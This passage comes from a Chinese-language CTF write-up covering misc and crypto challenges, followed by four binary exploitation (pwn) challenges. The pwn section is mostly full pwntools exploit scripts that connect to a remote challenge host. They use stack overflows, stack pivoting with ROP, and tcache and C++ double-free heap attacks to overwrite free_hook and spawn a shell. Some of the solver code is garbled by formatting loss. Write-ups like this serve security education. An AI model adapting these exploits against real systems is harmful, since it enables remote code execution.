然后上面有很多的红线，尝试将所有红线移到下方即可得到 flag

#### <a class="reference-link" name="Solve"></a>Solve

```
python 
from PIL import Image 
def re_turn(pixels,num): 
    return pixels[num:] [:num] 
p = Image.open('res.png').convert('RGB') 
a,b = p.size 
pixels = [] 
for x in range(a): 
    pixel = [] 
    for y in range(b): 
        pixel.append(p.getpixel((x,y))) 
    pixels.append(pixel) 
data = [] 
for i in pixels: 
    for j in range(len(i)): 
        if i[j] [j-1] and i[j-1] == (255, 0, 0): 
            data.append(j) 
            break 
_pixels = [] 
for i in range(len(data)): 
    _pixels.append(re_turn(pixels[i] [i])) 
p1 = Image.new('RGB',(a,b)) 
for x in range(a): 
    for y in range(b): 
        p1.putpixel((x,y),_pixels[x] [y]) 
p1.save('flag.png')
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a232f28563c87296.png)

#### <a class="reference-link" name="flag"></a>flag

```
flag`{`15e411a6efb9bfab823db05fcad16bff`}`
```

### <a class="reference-link" name="sign_in"></a>sign_in

#### <a class="reference-link" name="Description"></a>Description

66 6c 61 67 7b 39 35 63 35 62 66 33 32 32 39 32 64 37 35 66 35 37 61 35 30 36 37 36 66 36 61 62 35 64 64 38 33 7d

#### <a class="reference-link" name="Analyze"></a>Analyze

转 16 进制

#### <a class="reference-link" name="flag"></a>flag

```
flag`{`95c5bf32292d75f57a50676f6ab5dd83`}`
```

### <a class="reference-link" name="%E5%8A%A0%20%E5%AF%86%20%E5%AF%B9%20%E8%AF%9D"></a>加 密 对 话

#### <a class="reference-link" name="Description"></a>Description

阿巴阿巴歪比巴布

#### <a class="reference-link" name="Analyze"></a>Analyze

第一部分是简单的替换密码，替换回二进制即可，第二部分是 javaAES 解密，根据给的 AES 加密即可

#### <a class="reference-link" name="Solve"></a>Solve

替换密码：

```
python 
from Crypto.Util import number 
s = '''abaabawaibibabuwaibibabuwaibibabuwaibibabuwaibibabuabaaba 
abaabawaibibabuwaibibabuwaibibabuabaabawaibibabuabaaba 
abaabawaibibabuabaabawaibibabuwaibibabuabaabaabaaba 
abaabaabaabawaibibabuwaibibabuwaibibabuwaibibabuwaibibabu 
abaabaabaabawaibibabuwaibibabuwaibibabuabaabaabaaba 
abaabaabaabaabaabawaibibabuabaabawaibibabu 
abaabaabaabawaibibabuwaibibabuwaibibabuabaabawaibibabu 
abaabaabaabaabaabawaibibabuabaabawaibibabuabaaba 
abaabaabaabawaibibabuabaabawaibibabuwaibibabu 
abaabaabaabawaibibabuabaabaabaabawaibibabu 
abaabaabaabaabaabawaibibabuwaibibabuabaabawaibibabu 
abaabawaibibabuabaabawaibibabuwaibibabuwaibibabuabaaba 
abaabaabaabawaibibabuwaibibabuwaibibabuabaaba 
abaabawaibibabuabaabaabaabaabaabaabaaba 
abaabaabaabawaibibabuabaabaabaabaabaabawaibibabu 
abaabaabaabaabaabaabaabawaibibabuwaibibabuabaaba 
abaabaabaabaabaabawaibibabuabaabaabaabawaibibabu 
abaabawaibibabuwaibibabuwaibibabuabaabawaibibabuwaibibabu 
abaabaabaabaabaabawaibibabuabaabaabaabaabaaba 
abaabawaibibabuwaibibabuabaabawaibibabuwaibibabuwaibibabu 
abaabawaibibabuwaibibabuwaibibabuwaibibabuwaibibabuabaaba 
abaabaabaabawaibibabuabaabawaibibabuabaabawaibibabu 
abaabawaibibabuwaibibabuwaibibabuwaibibabuabaabawaibibabu 
abaabawaibibabuabaabaabaabaabaabaabaaba 
abaabaabaabawaibibabuabaabaabaabawaibibabuwaibibabu 
abaabawaibibabuwaibibabuabaabaabaabaabaabaabaaba 
abaabaabaabawaibibabuwaibibabuabaabaabaaba 
abaabaabaabawaibibabuwaibibabuabaabaabaaba 
abaabawaibibabuwaibibabuabaabaabaabaabaabaabaaba 
abaabawaibibabuabaabaabaabawaibibabuwaibibabuabaaba 
abaabawaibibabuabaabawaibibabuabaabaabaabawaibibabu 
abaabaabaabawaibibabuabaabawaibibabuabaabawaibibabu 
abaabawaibibabuwaibibabuabaabawaibibabuwaibibabuabaaba 
abaabawaibibabuabaabaabaabaabaabaabaaba 
abaabawaibibabuwaibibabuwaibibabuwaibibabuabaabaabaaba 
abaabaabaabawaibibabuwaibibabuwaibibabuabaabaabaaba 
abaabaabaabaabaabaabaabawaibibabuwaibibabuwaibibabu 
abaabaabaabaabaabaabaabawaibibabuwaibibabuwaibibabu 
abaabawaibibabuabaabawaibibabuwaibibabuwaibibabuabaaba 
abaabaabaabawaibibabuabaabaabaabawaibibabu 
abaabaabaabawaibibabuabaabaabaabawaibibabuwaibibabu 
abaabaabaabawaibibabuwaibibabuwaibibabuabaabaabaaba 
abaabaabaabawaibibabuabaabawaibibabuabaabaabaaba 
abaabawaibibabuwaibibabuwaibibabuabaabawaibibabuwaibibabu 
abaabawaibibabuwaibibabuabaabawaibibabuabaabawaibibabu 
abaabaabaabaabaabawaibibabuwaibibabuabaabaabaaba 
abaabawaibibabuwaibibabuabaabaabaabawaibibabuwaibibabu 
abaabaabaabawaibibabuabaabawaibibabuwaibibabu 
abaabawaibibabuabaabaabaabawaibibabuwaibibabuabaaba 
abaabawaibibabuwaibibabuwaibibabuwaibibabuabaabaabaaba 
abaabaabaabawaibibabuabaabaabaabaabaabawaibibabu 
abaabawaibibabuabaabaabaabaabaabaabaaba 
abaabawaibibabuwaibibabuabaabawaibibabuwaibibabuabaaba 
abaabaabaabaabaabawaibibabuwaibibabuabaabawaibibabu 
abaabaabaabaabaabawaibibabuwaibibabuabaaba 
abaabawaibibabuabaabawaibibabuabaabaabaaba 
abaabawaibibabuwaibibabuwaibibabuwaibibabuwaibibabuabaaba 
abaabawaibibabuwaibibabuwaibibabuabaabawaibibabuwaibibabu 
abaabawaibibabuabaabawaibibabuabaabaabaaba 
abaabawaibibabuwaibibabuwaibibabuabaabaabaabawaibibabu 
abaabaabaabaabaabawaibibabuwaibibabuabaaba 
abaabawaibibabuwaibibabuwaibibabuwaibibabuabaabaabaaba 
abaabawaibibabuwaibibabuwaibibabuwaibibabuabaabaabaaba 
abaabawaibibabuwaibibabuabaabawaibibabuwaibibabuabaaba 
abaabaabaabaabaabawaibibabuabaabaabaabaabaaba 
abaabaabaabaabaabawaibibabuabaabawaibibabuwaibibabu 
abaabaabaabaabaabawaibibabuwaibibabuwaibibabuwaibibabu 
abaabawaibibabuwaibibabuwaibibabuabaabawaibibabuabaaba 
abaabaabaabawaibibabuabaabaabaabaabaabawaibibabu 
abaabawaibibabuwaibibabuwaibibabuabaabaabaabaabaaba 
abaabawaibibabuabaabawaibibabu 
abaabawaibibabuwaibibabuwaibibabuwaibibabuwaibibabuabaaba 
abaabawaibibabuwaibibabuwaibibabuabaabawaibibabuabaaba 
abaabawaibibabuabaabawaibibabuwaibibabuabaabaabaaba 
abaabaabaabawaibibabuwaibibabuwaibibabuwaibibabuwaibibabu 
abaabaabaabawaibibabuabaabawaibibabuabaabaabaaba 
abaabaabaabawaibibabuwaibibabuabaabawaibibabuabaaba 
abaabaabaabaabaabaabaabawaibibabuwaibibabuabaaba 
abaabaabaabaabaabawaibibabuabaabawaibibabu 
abaabawaibibabuabaabawaibibabuabaabaabaabawaibibabu 
abaabawaibibabuabaabaabaabaabaabaabaabaabaaba 
abaabaabaabawaibibabuwaibibabuabaabaabaabaabaaba 
abaabaabaabawaibibabuabaabaabaabaabaabaabaaba 
abaabaabaabawaibibabuwaibibabuabaabawaibibabuwaibibabu 
abaabawaibibabuabaabaabaabaabaabaabaabaabaaba 
abaabaabaabawaibibabuabaabawaibibabuwaibibabuabaaba 
abaabaabaabaabaabawaibibabuwaibibabuabaabaabaaba 
abaabawaibibabuabaabaabaabaabaabaabaabaabaaba 
abaabaabaabaabaabawaibibabuwaibibabuabaabaabaaba 
abaabaabaabawaibibabuabaabaabaabaabaabaabaaba 
abaabawaibibabuabaabaabaabaabaabaabaabaabaaba 
abaabaabaabaabaabawaibibabuwaibibabuwaibibabuwaibibabu 
abaabaabaabawaibibabuabaabaabaabaabaabaabaaba 
abaabaabaabaabaabawaibibabuabaabaabaabaabaaba 
abaabaabaabawaibibabuwaibibabuabaabawaibibabuabaaba 
abaabaabaabaabaabawaibibabuwaibibabuabaabawaibibabu 
abaabaabaabawaibibabuwaibibabuabaabaabaabawaibibabu 
abaabaabaabaabaabawaibibabuabaabawaibibabuabaaba 
abaabaabaabawaibibabuabaabaabaabawaibibabuwaibibabu 
abaabawaibibabuwaibibabuwaibibabuwaibibabuabaaba 
abaabawaibibabuwaibibabuwaibibabuwaibibabuabaaba'''.replace('abaaba','1').replace('waibibabu','0') 
enc = s.split('\n') 
res = b'' 
for i in enc: 
    res += number.long_to_bytes(int(i,2)) 
print(res.decode())
```

得到

```
AES`c:bu46rQ1/nyvDwHAjB/lO33OYVjI/CcxxQ6lckDJsL4YCn/Ir9+AD+F9CCIwtpEnG

AES`key:V_god_is_so_powerful!!

AES：
package CTF; 
import javax.crypto.*; 
import javax.crypto.spec.SecretKeySpec; 
import java.io.IOException; 
import java.io.UnsupportedEncodingException; 
import java.nio.charset.StandardCharsets; 
import java.security.InvalidKeyException; 
import java.security.NoSuchAlgorithmException; 
import java.security.SecureRandom; 
import java.util.Arrays; 
import java.util.Base64; 
public class AESDecode `{` 
    public static byte[] [] content,String Pass)`{` 
        try `{` 
            KeyGenerator key = KeyGenerator.getInstance("AES"); 
            SecureRandom random = SecureRandom.getInstance("SHA1PRNG"); 
            random.setSeed(Pass.getBytes()); 
            key.init(128, random); 
            SecretKey secretKey = key.generateKey(); 
            byte[] enCodeFormat = secretKey.getEncoded(); 
            SecretKeySpec Key = new SecretKeySpec(enCodeFormat, "AES"); 
            Cipher cipher = Cipher.getInstance("AES"); 
            cipher.init(Cipher.DECRYPT_MODE,Key); 
            return cipher.doFinal(content); 
        `}` catch (NoSuchPaddingException | NoSuchAlgorithmException | InvalidKeyException | BadPaddingException | IllegalBlockSizeException e) `{` 
            e.printStackTrace(); 
        `}` 
        return null; 
    `}` 
    public static void main(String[] args) throws IOException `{` 
        String Pass = "V_god_is_so_powerful!!"; 
        String c = "bu46rQ1/nyvDwHAjB/lO33OYVjI/CcxxQ6lckDJsL4YCn/Ir9+AD+F9CCIwtpEnG"; 
        byte[] b_c = Base64.getDecoder().decode(c); 
        byte[] dec = AESEncode.decrypt(b_c,Pass); 
        System.out.print(new String(dec)); 
    `}` 
`}`
```

**flag`{`b80c4dd8b4a445f8041ebca018791e38`}`**

## pwn

### <a class="reference-link" name="backdoor"></a>backdoor

考点：数组越界、栈残留数据

分析：在 func1 中输入的字符串，函数返回后还会留在内存空间，绕过 func2 验证，之后将返回地址修改为后门函数

exp:

```
python
#!/usr/bin/python
from pwn import *
context.log_level='debug'
#p = process('./backdoor_for_jianjian')
p = remote('121.41.13.20','32773')
#gdb.attach(p,'b *0x40086F')
p.recvuntil('(y/n)')
p.send('a'*108+p32(0x8180754))
p.recvuntil('required!')
p.send(p64(0))
p.recvuntil('success!')
p.sendline('a'*0x18+p64(0x4007C3))
p.interactive()
```

### <a class="reference-link" name="suggestion_box"></a>suggestion_box

考点：栈迁移

分析：

1.第一次输入在 bss 中布置好泄露地址和 getshell 的 rop 链

2.第二次输入劫持返回地址后用两个 `leave ret` “ 把栈迁移到 bss 段

exp:

```
python
#!/usr/bin/python 
from pwn import * 
from LibcSearcher import * 
context.log_level='debug' 
#p = process('./suggestion_box') 
p = remote('121.41.13.20',32775) 
elf = ELF('./suggestion_box') 
libc=ELF("./libc-2.23.so") 
#gdb.attach(p,'b *0x400707') 
pop_rdi = 0x400783 
puts=elf.plt['puts'] 
puts_got=elf.got['puts'] 
read = 0x400682 
leave = 0x40069c 
p.recvuntil('suggestions:') 
p.send('a'*8*10+p64(0x602040+80)+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(read)) 
p.recvuntil('.\n') 
p.send('\x01'*0x10+p64(0x602040+80)+p64(leave)) 
puts=u64(p.recv(6).ljust(8,'\x00')) 
print hex(puts) 
libcbase=puts-libc.sym['puts'] 
system_addr=libcbase+libc.sym['system'] 
bin_sh=libcbase+libc.search("/bin/sh\x00").next() 
p.send('a'*8*10+p64(0x602040+100)+p64(pop_rdi)+p64(bin_sh)+p64(system_addr)) 
p.interactive()
```

### <a class="reference-link" name="BabyTcache"></a>BabyTcache

考点：

Tcache、构造重叠的堆块、利用 IO_FILE 结构体泄露 libc

分析：

1.利用改写 IO_write_base 泄露 libc

2.利用程序中的 Off by one 漏洞实现 double free

3.可以通过申请 7 个以上的 chunk 或者改写 chunk size 绕过程序对申请 chunk 大小的限制

exp：

```
from pwn import * 
#from LibcSearcher import LibcSearcher 
context(log_level='debug',arch='amd64') 
local=0 
binary_name='babytcache' 
if local: 
    p=process("./"+binary_name) 
    e=ELF("./"+binary_name) 
    libc=e.libc 
else: 
    p=remote("121.41.13.20",32772) 
    e=ELF("./"+binary_name) 
    libc=ELF("./libc-2.27.so") 
def z(a=''): 
    if local: 
        gdb.attach(p,a) 
        if a=='': 
            raw_input 
    else: 
        pass 
ru=lambda x:p.recvuntil(x) 
sl=lambda x:p.sendline(x) 
sd=lambda x:p.send(x) 
sla=lambda a,b:p.sendlineafter(a,b) 
ia=lambda :p.interactive() 
def leak_address(): 
    if(context.arch=='i386'): 
        return u32(p.recv(4)) 
    else : 
        return u64(p.recv(6).ljust(8,'\x00')) 

def add(len,data): 
    sla("Please input your choice:",'1') 
    sla("The length of your info:",str(len)) 
    ru("Data:") 
    sd(data) 
def dele(idx): 
    sla("Please input your choice:",'2') 
    sla("Index:",str(idx)) 
add(0x10,'a') 
add(0x400,'a') 
add(0x60,'a') 
add(0x30,'a') 
add(0x20,'a') 
dele(0) 
pd='a'*0x18+'\xc1' 
add(0x18,pd) 
dele(1) 
dele(2) 
dele(3) 
add(0x400,'a') 
pd='\x60\x97' 
add(0x10,pd) 
add(0x60,'a') 
pd=p64(0xfbad1800)+p64(0)*3+'\x00' 
add(0x60,pd) 
p.recv(0x80) 
leak_addr=leak_address() 
libc_base=leak_addr-libc.sym['_IO_2_1_stderr_']-128 
print hex(libc_base) 
system=libc_base+libc.sym['system'] 
free_hook=libc_base+libc.sym['__free_hook'] 
add(0x20,'a') 
pd='a'*0x20+p64(free_hook) 
add(0x40,pd) 
add(0x30,'/bin/sh\x00') 
add(0x30,p64(system)) 
dele(8) 
p.interactive()
```

### <a class="reference-link" name="Containers"></a>Containers

框架与 De1ctf 的 STL Containers 一样，漏洞是常见的 C++程序错误：含有指针类型的对象需要实现深拷贝函数和赋值运算符重载，否则在使用 STL 函数时实际上传递的只是指针，所指向的内存空间是相同的，就会造成 double free。在这道题的源码中没有实现赋值运算符重载函数，在 vector 的 add 操作中通过赋值运算后再传递给 push_back 函数。实际上，如果觉得 C++反汇编代码分析起来比较费时可以直接运行调试，不难发现这一点。接下来就是利用漏洞点，泄露地址后改写 free_hook 为 system 函数。

exp：

```
from pwn import * 
#from LibcSearcher import LibcSearcher 
context(log_level='debug',arch='amd64') 
local=0 
binary_name='containers' 
if local: 
    p=process("./"+binary_name) 
    e=ELF("./"+binary_name) 
    libc=e.libc 
else: 
    p=remote("121.41.13.20",32774) 
    e=ELF("./"+binary_name) 
    libc=ELF("./libc-2.27.so") 

def z(a=''): 
    if local: 
        gdb.attach(p,a) 
        if a=='': 
            raw_input 
    else: 
        pass 
ru=lambda x:p.recvuntil(x) 
sl=lambda x:p.sendline(x) 
sd=lambda x:p.send(x) 
sla=lambda a,b:p.sendlineafter(a,b) 
ia=lambda :p.interactive() 
def leak_address(): 
    if(context.arch=='i386'): 
        return u32(p.recv(4)) 
    else : 
        return u64(p.recv(6).ljust(8,'\x00')) 

def add(container,data): 
    sla("Input your choice:",str(container)) 
    sla("Input your choice:",'1') 
    ru("input data:") 
    sd(data) 
def dele(container): 
    sla("Input your choice:",str(container)) 
    sla("Input your choice:",'2') 
def dele2(container,idx): 
    sla("Input your choice:",str(container)) 
    sla("Input your choice:",'2') 
    sla("Index:",str(idx)) 
def show(container,idx): 
    sla("Input your choice:",str(container)) 
    sla("Input your choice:",'3') 
    sla("Index:",str(idx)) 

#z('b *(0x555555554000+0x20BB)\nb *(0x555555554000+0x1FD9)\nb *(0x555555554000+0x201B)') 
add(1,'a') 
add(1,'a') 
add(3,'a') 
add(3,'a') 
add(4,'a') 
add(4,'a') 
dele2(1,0) 
dele2(1,1) 
dele(3) 
dele(3) 
dele(4) 
dele(4) 
add(2,'a') 
dele(2) 
add(2,'a') 
dele(2) 
add(1,'a') 
dele2(1,0) 
add(2,'a') 
dele(2) 
show(1,0) 
leak_addr=leak_address() 
libc_base=leak_addr-libc.sym['__malloc_hook']-96-0x10 
print hex(libc_base) 
free_hook=libc_base+libc.sym['__free_hook'] 
system=libc_base+libc.sym['system'] 
add(4,p64(free_hook)) 
add(3,p64(system)) 
add(4,'/bin/sh\x00') 
p.interactive()
```
